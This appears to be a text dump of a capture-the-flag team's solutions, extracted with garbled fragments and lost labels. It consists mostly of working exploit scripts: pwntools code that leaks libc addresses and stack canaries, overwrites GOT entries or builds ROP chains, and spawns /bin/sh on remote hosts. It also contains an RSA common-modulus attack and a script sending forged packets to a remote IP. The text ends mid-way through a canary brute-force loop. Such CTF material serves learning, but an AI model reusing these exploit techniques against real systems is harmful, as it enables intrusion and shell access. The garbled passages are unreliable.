//     // uint8_t test[16] = {0};
//     // uint8_t test_out[16] = {0};
//     // RC4(&test,16,&test_out);
//     // for(int i=0;iH', target_port))
fake_header = bytes([(fake_header[i] ^ predict_xor_key[i]) for i in 
range(len(fake_header))])
fake_data = fake_header + recv_data[len(fake_header):]
print(fake_data.hex())
s = socket.socket()
s.connect(("121.36.47.205", 1080))
s.send(fake_data)
print('Tcp sendingâ€¦ ')
print(s.recv(1024))
time.sleep(3)
s.close()
rosb
PWN
pwnme
armpwneditheap
freegot
system
from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime
from gmpy2 import gcdext, invert
n = 
0xa1d4d377001f1b8d5b2740514ce699b49dc8a02f12df9a960e80e2a6ee13b7a97d9f508721e3
dd7a6842c24ab25ab87d1132358de7c6c4cee3fb3ec9b7fd873626bd0251d16912de1f0f1a2bba
52b082339113ad1a262121db31db9ee1bf9f26023182acce8f84612bfeb075803cf610f27b7b16
147f7d29cc3fd463df7ea31ca860d59aae5506479c76206603de54044e7b778e21082c4c4da795
d39dc2b9c0589e577a773133c89fa8e3a4bd047b8e7d6da0d9a0d8a3c1a3607ce983deb350e1c6
49725cccb0e9d756fc3107dd4352aa18c45a65bab7772a4c5aef7020a1e67e6085cc125d9fc042
d96489a08d885f448ece8f7f254067dfff0c4e72a63557L
e1 = 0xf4c1158fL
e2 = 0xf493f7d1L
c1 = 
0x2f6546062ff19fe6a3155d76ef90410a3cbc07fef5dff8d3d5964174dfcaf9daa003967a29c5
16657044e87c1cbbf2dba2e158452ca8b7adba5e635915d2925ac4f76312feb3b0c85c3b8722c0
e4aedeaec2f2037cc5f676f99b7260c3f83ffbaba86cda0f6a9cd4c70b37296e8f36c3ceaae15b
5bf0b290119592ff03427b80055f08c394e5aa6c45bd634c80c59a9f70a92dc70eebec15d4a5e2
56bf78775e0d3d14f3a0103d9ad8ea6257a0384091f14da59e52581ba2e8ad3adb9747435e9283
e8064de21ac41ab2c7b161a3c072b7841d4a594a8b348a923d4cc39f02e05ce95a69c7500c29f6
bb415c11e4e0cdb410d0ec2644d6243db38e893c8a3707L
c2 = 
0xd32dfad68d790022758d155f2d8bf46bb762ae5cc17281f2f3a8794575ec684819690b22106c
1cdaea06abaf7d0dbf841ebd152be51528338d1da8a78f666e0da85367ee8c1e6addbf590fc15f
1b2182972dcbe4bbe8ad359b7d15febd5597f5a87fa4c6c51ac4021af60aeb726a3dc7689daed7
0144db57d1913a4dc29a2b2ec34c99c507d0856d6bf5d5d01ee514d47c7477a7fb8a6747337e7c
af2d6537183c20e14c7b79380d9f7bcd7cda9e3bfb00c2b57822663c9a5a24927bceec316c8ffc
59ab3bfc19f364033da038a4fb3ecef3b4cb299f4b600f76b8a518b25b576f745412fe53d229e7
7e68380397eee6ffbc36f6cc734815cd4065dc73dcbcbL
_, s1, s2 = gcdext(e1, e2)
s2 = -s2
c2 = invert(c2, n)
m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
print(long_to_bytes(m)[:-64])
from pwn import *
context.log_level = 'debug'
# p = process(["qemu-arm","-L",".","-g","6666","./a.out"])
twice
canary
putslibcreadrop
p = remote('121.36.58.215', 1337)
def add(s,c):
    p.sendlineafter('>>> ','2')
    p.sendlineafter('Length',str(s))
    p.sendafter('Tag',c)
def show():
    p.sendlineafter('>>> ','1')
def edit(i,s,c):
    p.sendlineafter('>>> ','3')
    p.sendlineafter('Index',str(i))
    p.sendlineafter('Length',str(s))
    p.sendafter('Tag',c)
def delete(i):
    p.sendlineafter('>>> ','4')
    p.sendafter('Tag',str(i))
add(0x70,'aaa')
add(0x70,'aaa')
add(0x70,'aaa')
add(0x70,'aaa')
add(0x70,'aaa')
delete(3)
delete(1)
edit(0,40,p32(0x00021038) * 5 + p32(0x2106C + 8) * 5)
indexo = (0x22018 - 0x2106C)/8 + 2
edit(indexo + 2,4,p32(0x021038))
show()
p.recvuntil('1 : ')
leak_libc = u32(p.recv(4))
log.info('leak libc ' + hex(leak_libc))
sys_addr = (0x51800 - 0x4A55C) + leak_libc
edit(indexo,4,p32(sys_addr))
edit(0,8,'/bin/sh\x00')
delete(0)
p.interactive()
from pwn import *
of
free0uafdeleteedit
600
overlapunsorted binlibctcache attackfree_hooksystem
# p = process('./pwn')
p = remote('121.36.59.116', 9999)
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def call_func(call_addr, p1, p2, p3):
  pl = ""
  pl += p64(0x40091A)
  pl += p64(0)
  pl += p64(1)
  pl += p64(call_addr)
  pl += p64(p1)+p64(p2)+p64(p3)
  pl += p64(0x400900)
  return pl
# launch_gdb()
p.sendafter('>','a'*89)
p.recvuntil('a'*89)
leak = '\x00' + p.recv(7)
canary = u64(leak)
leak_stack = u64(p.recv(6) + '\x00' * 2)
log.info('leak ' + hex(canary) + '    ' + hex(leak_stack))
payload = p64(0x0000000000400923) + p64(0x601020) # rdi
payload += p64(0x4005C0)
payload += call_func(0x601038,0x100,leak_stack-112,0)
p.sendafter('>',payload.ljust(88,'a') + p64(canary) + p64(leak_stack-112-8) + 
p64(0x400879))
p.recvline()
leak_puts = u64(p.recv(6) + '\x00' * 2)
log.info('leak libc ' + hex(leak_puts))
sys_addr = leak_puts - 172800
p.send(p64(0x40087A) * 12 +p64(0x0000000000400923)+ 
p64(1169095+leak_puts)+p64(sys_addr))
p.interactive()
from pwn import *
p = remote('121.36.74.70', 9999)
# p = process('./of')
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def add(i):
    p.sendlineafter('Your choice: ','1')
    p.sendlineafter('Index: ',str(i))
def dele(i):
    p.sendlineafter('Your choice: ','4')
    p.sendlineafter('Index: ',str(i))
def edit(i,c):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter('Index: ',str(i))
    p.sendafter('Content:',c)
def show(i):
    p.sendlineafter('Your choice: ','3')
    p.sendlineafter('Index: ',str(i))
    # p.recvuntil('Content: ')
def leak_addr(s):
    p.recvuntil('Content: ')
    t = u64(p.recv(6).ljust(8,'\x00'))
    log.info('leak ' + s + ' ' + hex(t))
    return t
'''
count = 0
cookie = ''
while len(cookie) != 8:
    for i in xrange(0,0x100):
        add(0)
        count += 1
        edit(0,'a'*(0x100 - 8) + cookie + chr(i))